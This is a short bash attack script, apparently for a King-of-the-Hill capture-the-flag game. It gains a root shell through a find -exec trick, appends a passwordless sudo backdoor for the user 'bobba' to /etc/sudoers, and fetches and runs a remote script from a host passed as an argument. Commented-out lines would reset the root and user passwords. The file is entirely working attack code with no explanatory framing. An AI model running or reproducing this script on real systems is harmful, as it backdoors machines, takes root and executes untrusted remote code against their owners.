#!/bin/bash

vpn="$1"

find . -exec /bin/sh \; -quit
echo "bobba ALL=(ALL) NOPASSWD: /bin/su" >> /etc/sudoers
sudo su
cd /boot && wget http://$vpn/koth.sh && chmod +x koth.sh && ./koth.sh $vpn $nick
#echo "$password" | passwd --stdin root
#echo "$password" | passwd --stdin bobba
